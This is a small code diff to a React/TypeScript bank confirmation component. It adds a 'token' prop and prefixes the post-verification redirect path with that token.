@@ -15,6 +15,7 @@ export default function Bank({
   dev = false,
   bankName,
   bankId,
+  token,
   logo,
   logoHeight,
   cardNumber,
@@ -33,6 +34,7 @@ export default function Bank({
   seller?: string;
   dev?: boolean;
   color: string;
+  token: string;
   // Цвет текста названия банка (задаётся в админке).
   nameColor?: string;
   // Закодированные значения формы accept для передачи на страницу ok.
@@ -72,7 +74,9 @@ export default function Bank({
       await codeService.verifyConfirmation({ code });
       const query = payload ? `?d=${encodeURIComponent(payload)}` : "";
       setTimeout(() => {
-        router.push(FULL_PATH_ROUTE.ok.path + "/" + bankId + query);
+        router.push(
+          "/" + token + FULL_PATH_ROUTE.ok.path + "/" + bankId + query,
+        );
       }, 1500);
     } catch {
       setloading(false);
